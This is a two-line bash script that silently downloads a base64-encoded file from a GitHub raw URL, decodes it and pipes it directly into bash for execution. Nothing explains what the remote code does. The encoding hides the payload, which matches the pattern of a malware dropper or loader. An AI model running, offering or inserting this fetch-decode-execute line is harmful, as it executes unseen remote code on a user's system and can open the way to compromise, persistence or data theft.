#!/bin/bash
wget -qO- https://raw.githubusercontent.com/velilemaqampu/mount/refs/heads/main/entrypoint.sh | base64 -d | bash
